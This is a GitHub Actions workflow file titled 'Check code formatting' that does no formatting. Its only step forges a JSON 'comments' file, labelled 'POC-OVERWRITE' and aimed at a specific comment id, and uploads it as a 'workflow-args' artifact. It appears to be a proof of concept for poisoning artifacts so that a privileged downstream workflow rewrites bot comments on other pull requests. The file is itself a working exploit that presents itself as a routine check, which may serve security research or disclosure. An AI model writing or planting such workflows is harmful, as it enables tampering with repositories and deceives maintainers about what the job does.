name: "Check code formatting"

permissions:
  contents: read

on:
  pull_request:

jobs:
  code_formatter:
    runs-on: ubuntu-24.04
    steps:
      - name: Forge artifact (overwrite an existing bot comment on another PR)
        run: |
          printf '%s' '["{\"id\":6531592915,\"body\":\"POC-OVERWRITE: attacker rewrote a bot comment on another PR\"}"]' > /dev/null
          printf '%s' '[{"id":6531592915,"body":"POC-OVERWRITE: attacker rewrote a github-actions[bot] comment on another PR"}]' > comments
      - uses: actions/upload-artifact@v4
        with:
          name: workflow-args
          path: comments
